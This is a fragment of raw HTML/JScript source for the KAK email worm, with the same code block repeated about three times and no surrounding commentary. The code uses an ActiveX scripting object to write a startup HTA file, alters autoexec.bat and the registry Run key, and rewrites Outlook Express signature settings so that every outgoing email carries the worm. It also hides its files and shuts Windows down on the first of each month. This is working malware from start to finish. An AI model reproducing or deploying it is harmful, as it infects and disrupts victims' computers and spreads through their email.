r)?wd+'MENUD~1\\\\PROGRA~1\\\\DMARR~1\\\\kak.hta':ken;t1.WriteLine('@echo 
off>'+pth);t1.WriteLine('del 
'+pth);t1.Close();}}if(!fs.FileExists(k2)){fs.CopyFile(kk,k2);fs.GetFile(k2).Attr
ibutes=2;}t2=fs.CreateTextFile(wd+'kak.reg');t2.write('REGEDIT4');t2.WriteBlankLi
nes(2);ky='[HKEY 
CURRENT USER\\\\Identities\\\\'+idn+'\\\\Software\\\\Microsoft\\\\Outlook 
Express\\\\5.0';sg='\\\\signatures';t2.WriteLine(ky+sg+']');t2.Write('\"Default 
Signature\"=\"00000000\"');t2.WriteBlankLines(2);t2.WriteLine(ky+sg+'\\\\00000000
]');t2.WriteLine('\"name\"=\"Signature 
#1\"');t2.WriteLine('\"type\"=dword:00000002');t2.WriteLine('\"text\"=\"\"');t2.W
rite('\"file\"=\"C:\\\\\\\\WINDOWS\\\\\\\\kak.htm\"');t2.WriteBlankLines(2);t2.Wr
iteLine(ky+']');t2.Write('\"Signature 
Flags\"=dword:00000003');t2.WriteBlankLines(2);t2.WriteLine('[HKEY LOCAL 
MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run]');t2.Write(
'\"cAg0u\"=\"C:\\\\\\\\WINDOWS\\\\\\\\SYSTEM\\\\\\\\'+fic+'.hta\"');t2.WriteBlank
Lines(2);t2.close();wsh.Run(wd+'Regedit.exe 
-s 
'+wd+'kak.reg');t3=fs.CreateTextFile(wd+'kak.htm',1);t3.Write('<HTML><BODY><DIV 
style=\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\"><OBJECT 
classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC 
id=scr></"+"OBJECT></"+"DIV>');t4=fs.OpenTextFile(k2,1);while(t4.Read(1)!='Z');t3.Writ
eLine('<SCRIPT><!--');t3.write('function 
sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc=\"Z');rs=t4.Read(3095);t4.close();r
d=/\\\\/g;re=/\"/g;rf=/<\\//g;rt=rs.replace(rd,'\\\\\\\\').replace(re,'\\\\\"').re
place(rf,'</"+"\"+\"');t3.WriteLine(rt+'\";la=(navigator.systemLanguage)?navigator
.systemLanguage:navigator.language;scr.Path=(la==\"fr\")?\"C:\\\\\\\\windows\\\\\
\\\Menu 
Démarrer\\\\\\\\Programmes\\\\\\\\Démarrage\\\\\\\\kak.hta\":\"C:\\\\\\\\windows\
\\\\\\\Start 
Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\kak.hta\";agt=navigator.userAgent.toLo
werCase();if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(a
gt.indexOf(\"msie 
5.\")!=-1))scr.write();');t3.write('// 
--></"+"'+'SCRIPT></"+"'+'OBJECT></"+"'+'BODY></"+"'+'HTML>');t3.close();fs.GetFile(wd+'ka
k.htm').Attributes=2;fs.DeleteFile(wd+'kak.reg');d=new 
Date();if(d.getDate()==1 && d.getHours()>17){alert('Kagou-Anti-Kro$oft 
says not today !');wsh.Run(wd+'RUNDLL32.EXE 
user.exe,exitwindows');}self.close();</"+"SCRIPT>S3 driver memory alloc 
failed   
!]]%%%%%</"+"BODY></"+"HTML";la=(navigator.systemLanguage)?navigator.systemLanguage:
navigator.language;scr.Path=(la=="fr")?"C:\\windows\\Menu 
Démarrer\\Programmes\\Démarrage\\kak.hta":"C:\\windows\\Start 
Menu\\Programs\\StartUp\\kak.hta";agt=navigator.userAgent.toLowerCase();if(((agt.
indexOf("msie")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf("msie 
5.")!=-1))scr.write();
// --></SCRIPT>
</OBJECT></FONT>
<SCRIPT><!--
function sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc="Z<HTML><HEAD><TITLE>Driver 
Memory Error</"+"TITLE><HTA:APPLICATION ID=\"hO\" 
WINDOWSTATE=Minimize></"+"HEAD><BODY BGCOLOR=#CCCCCC><object id='wsh' 
classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></"+"object><SCRIPT>function 
sEr(){self.close();return true;}window.onerror=sEr;fs=new 
ActiveXObject('Scripting.FileSystemObject');wd='C:\\\\Windows\\\\';fl=fs.GetFolde
r(wd+'Applic~1\\\\Identities');sbf=fl.SubFolders;for(var 
mye=new Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=mye.item();ids=new 
String(idd);idn=ids.slice(31);fic=idn.substring(1,9);kfr=wd+'MENUDÉ~1\\\\PROGRA~1
\\\\DÉMARR~1\\\\kak.hta';ken=wd+'STARTM~1\\\\Programs\\\\StartUp\\\\kak.hta';k2=w
d+'System\\\\'+fic+'.hta';kk=(fs.FileExists(kfr))?kfr:ken;aek='C:\\\\AE.KAK';aeb=
'C:\\\\Autoexec.bat';if(!fs.FileExists(aek)){re=/kak.hta/i;if(hO.commandLine.sear
ch(re)!=-1){f1=fs.GetFile(aeb);f1.Copy(aek);t1=f1.OpenAsTextStream(8);pth=(kk==kf
r)?wd+'MENUD~1\\\\PROGRA~1\\\\DMARR~1\\\\kak.hta':ken;t1.WriteLine('@echo 
off>'+pth);t1.WriteLine('del 
'+pth);t1.Close();}}if(!fs.FileExists(k2)){fs.CopyFile(kk,k2);fs.GetFile(k2).Attr
ibutes=2;}t2=fs.CreateTextFile(wd+'kak.reg');t2.write('REGEDIT4');t2.WriteBlankLi
nes(2);ky='[HKEY 
CURRENT USER\\\\Identities\\\\'+idn+'\\\\Software\\\\Microsoft\\\\Outlook 
Express\\\\5.0';sg='\\\\signatures';t2.WriteLine(ky+sg+']');t2.Write('\"Default 
Signature\"=\"00000000\"');t2.WriteBlankLines(2);t2.WriteLine(ky+sg+'\\\\00000000
]');t2.WriteLine('\"name\"=\"Signature 
#1\"');t2.WriteLine('\"type\"=dword:00000002');t2.WriteLine('\"text\"=\"\"');t2.W
rite('\"file\"=\"C:\\\\\\\\WINDOWS\\\\\\\\kak.htm\"');t2.WriteBlankLines(2);t2.Wr
iteLine(ky+']');t2.Write('\"Signature 
Flags\"=dword:00000003');t2.WriteBlankLines(2);t2.WriteLine('[HKEY LOCAL 
MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run]');t2.Write(
'\"cAg0u\"=\"C:\\\\\\\\WINDOWS\\\\\\\\SYSTEM\\\\\\\\'+fic+'.hta\"');t2.WriteBlank
Lines(2);t2.close();wsh.Run(wd+'Regedit.exe 
-s 
'+wd+'kak.reg');t3=fs.CreateTextFile(wd+'kak.htm',1);t3.Write('<HTML><BODY><DIV 
style=\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\"><OBJECT 
classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC 
id=scr></"+"OBJECT></"+"DIV>');t4=fs.OpenTextFile(k2,1);while(t4.Read(1)!='Z');t3.Writ
eLine('<SCRIPT><!--');t3.write('function 
sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc=\"Z');rs=t4.Read(3095);t4.close();r
d=/\\\\/g;re=/\"/g;rf=/<\\//g;rt=rs.replace(rd,'\\\\\\\\').replace(re,'\\\\\"').re
place(rf,'</"+"\"+\"');t3.WriteLine(rt+'\";la=(navigator.systemLanguage)?navigator
.systemLanguage:navigator.language;scr.Path=(la==\"fr\")?\"C:\\\\\\\\windows\\\\\
\\\Menu 
Démarrer\\\\\\\\Programmes\\\\\\\\Démarrage\\\\\\\\kak.hta\":\"C:\\\\\\\\windows\
\\\\\\\Start 
Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\kak.hta\";agt=navigator.userAgent.toLo
werCase();if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(a
gt.indexOf(\"msie 
5.\")!=-1))scr.write();');t3.write('// 
--></"+"'+'SCRIPT></"+"'+'OBJECT></"+"'+'BODY></"+"'+'HTML>');t3.close();fs.GetFile(wd+'ka
k.htm').Attributes=2;fs.DeleteFile(wd+'kak.reg');d=new 
Date();if(d.getDate()==1 && d.getHours()>17){alert('Kagou-Anti-Kro$oft says 
not today !');wsh.Run(wd+'RUNDLL32.EXE 
user.exe,exitwindows');}self.close();</"+"SCRIPT>S3 driver memory alloc 
failed   
!]]%%%%%</"+"BODY></"+"HTML";la=(navigator.systemLanguage)?navigator.systemLanguage:
navigator.language;scr.Path=(la=="fr")?"C:\\windows\\Menu 
Démarrer\\Programmes\\Démarrage\\kak.hta":"C:\\windows\\Start 
Menu\\Programs\\StartUp\\kak.hta";agt=navigator.userAgent.toLowerCase();if(((agt.
indexOf("msie")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf("msie 
5.")!=-1))scr.write();
// --></SCRIPT>
</OBJECT></FONT>
<SCRIPT><!--
function sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc="Z<HTML><HEAD><TITLE>Driver 
Memory Error</"+"TITLE><HTA:APPLICATION ID=\"hO\" 
WINDOWSTATE=Minimize></"+"HEAD><BODY BGCOLOR=#CCCCCC><object id='wsh' 
classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></"+"object><SCRIPT>function 
sEr(){self.close();return true;}window.onerror=sEr;fs=new 
ActiveXObject('Scripting.FileSystemObject');wd='C:\\\\Windows\\\\';fl=fs.GetFolde
r(wd+'Applic~1\\\\Identities');sbf=fl.SubFolders;for(var 
mye=new Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=mye.item();ids=new 
String(idd);idn=ids.slice(31);fic=idn.substring(1,9);kfr=wd+'MENUDÉ~1\\\\PROGRA~1
\\\\DÉMARR~1\\\\kak.hta';ken=wd+'STARTM~1\\\\Programs\\\\StartUp\\\\kak.hta';k2=w
d+'System\\\\'+fic+'.hta';kk=(fs.FileExists(kfr))?kfr:ken;aek='C:\\\\AE.KAK';aeb=
'C:\\\\Autoexec.bat';if(!fs.FileExists(aek)){re=/kak.hta/i;if(hO.commandLine.sear
ch(re)!=-1){f1=fs.GetFile(aeb);f1.Copy(aek);t1=f1.OpenAsTextStream(8);pth=(kk==kf
r)?wd+'MENUD~1\\\\PROGRA~1\\\\DMARR~1\\\\kak.hta':ken;t1.WriteLine('@echo 
off>'+pth);t1.WriteLine('del 
'+pth);t1.Close();}}if(!fs.FileExists(k2)){fs.CopyFile(kk,k2);fs.GetFile(k2).Attr
ibutes=2;}t2=fs.CreateTextFile(wd+'kak.reg');t2.write('REGEDIT4');t2.WriteBlankLi
nes(2);ky='[HKEY 
CURRENT USER\\\\Identities\\\\'+idn+'\\\\Software\\\\Microsoft\\\\Outlook 
Express\\\\5.0';sg='\\\\signatures';t2.WriteLine(ky+sg+']');t2.Write('\"Default 
Signature\"=\"00000000\"');t2.WriteBlankLines(2);t2.WriteLine(ky+sg+'\\\\00000000
]');t2.WriteLine('\"name\"=\"Signature 
#1\"');t2.WriteLine('\"type\"=dword:00000002');t2.WriteLine('\"text\"=\"\"');t2.W
rite('\"file\"=\"C:\\\\\\\\WINDOWS\\\\\\\\kak.htm\"');t2.WriteBlankLines(2);t2.Wr
iteLine(ky+']');t2.Write('\"Signature 
Flags\"=dword:00000003');t2.WriteBlankLines(2);t2.WriteLine('[HKEY LOCAL 
MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run]');t2.Write(
'\"cAg0u\"=\"C:\\\\\\\\WINDOWS\\\\\\\\SYSTEM\\\\\\\\'+fic+'.hta\"');t2.WriteBlank
Lines(2);t2.close();wsh.Run(wd+'Regedit.exe 
-s 
'+wd+'kak.reg');t3=fs.CreateTextFile(wd+'kak.htm',1);t3.Write('<HTML><BODY><DIV 
style=\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\"><OBJECT 
classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC 
id=scr></"+"OBJECT></"+"DIV>');t4=fs.OpenTextFile(k2,1);while(t4.Read(1)!='Z');t3.Writ
eLine('<SCRIPT><!--');t3.write('function 
sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc=\"Z');rs=t4.Read(3095);t4.close();r
d=/\\\\/g;re=/\"/g;rf=/<\\//g;rt=rs.replace(rd,'\\\\\\\\').replace(re,'\\\\\"').re
place(rf,'</"+"\"+\"');t3.WriteLine(rt+'\";la=(navigator.systemLanguage)?navigator
.systemLanguage:navigator.language;scr.Path=(la==\"fr\")?\"C:\\\\\\\\windows\\\\\
\\\Menu 
Démarrer\\\\\\\\Programmes\\\\\\\\Démarrage\\\\\\\\kak.hta\":\"C:\\\\\\\\windows\
\\\\\\\Start 
Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\kak.hta\";agt=navigator.userAgent.toLo
werCase();if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(a
gt.indexOf(\"msie 
5.\")!=-1))scr.write();');t3.write('// 
--></"+"'+'SCRIPT></"+"'+'OBJECT></"+"'+'BODY></"+"'+'HTML>');t3.close();fs.GetFile(wd+'ka
k.htm').Attributes=2;fs.DeleteFile(wd+'kak.reg');d=new 
Date();if(d.getDate()==1 && d.getHours()>17){alert('Kagou-Anti-Kro$oft 
says not today !');wsh.Run(wd+'RUNDLL32.EXE 
user.exe,exitwindows');}self.close();</"+"SCRIPT>S3 driver memory alloc 
failed   
!]]%%%%%</"+"BODY></"+"HTML";la=(navigator.systemLanguage)?navigator.systemLanguage:
navigator.language;scr.Path=(la=="fr")?"C:\\windows\\Menu 
Démarrer\\Programmes\\Démarrage\\kak.hta":"C:\\windows\\Start 
Menu\\Programs\\StartUp\\kak.hta";agt=navigator.userAgent.toLowerCase();if(((agt.
indexOf("msie")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf("msie 
5.")!=-1))scr.write();
// --></SCRIPT>
</OBJECT></DIV></BODY></HTML>